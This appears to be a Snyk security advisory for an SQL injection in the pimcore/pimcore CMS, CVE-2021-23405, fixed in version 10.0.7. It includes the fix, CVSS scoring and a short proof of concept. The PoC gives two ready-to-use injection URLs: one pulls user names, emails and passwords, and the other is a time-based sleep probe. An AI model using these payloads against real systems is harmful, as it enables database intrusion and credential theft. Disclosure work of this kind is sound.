Exploit Maturity

Snyk has a published code exploit for this vulnerability.

MatureEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 8 Jul 2021

[CVE-2021-23405  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23405) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-89  (opens in a new tab)](https://cwe.mitre.org/data/definitions/89.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `pimcore/pimcore` to version 10.0.7 or higher.

## Overview

[pimcore/pimcore](https://packagist.org/packages/pimcore/pimcore) is a content & product management framework (CMS/PIM/E-Commerce).

Affected versions of this package are vulnerable to SQL Injection. This issue exists due to the absence of check on the `storeId` parameter in the method `collectionsActionGet` and `groupsActionGet` method within the `ClassificationstoreController` class.

### PoC

```
Send the following GET request with the payload in storeId parameter

/admin/classificationstore/groups?_dc=1622204293193&storeId=1) union (select '12',name,'4',email,password,'7','8' from users) -- -

/admin/classificationstore/collections?_dc=1624542952813&storeId=1 or 1=1) union (select sleep(10)) -- -

```

* [GitHub PR](https://github.com/pimcore/pimcore/pull/9572)
### CVSS Scores

version 3.1
### Snyk

8.3 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker requires privileges that provide basic user capabilities that could normally affect only settings and files owned by a user. Alternatively, an attacker with Low privileges has the ability to access only non-sensitive resources.

  **Low**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users. The resources in the impacted component are either partially available all of the time, or fully available only some of the time, but overall there is no direct, serious consequence to the impacted component.

  **Low**
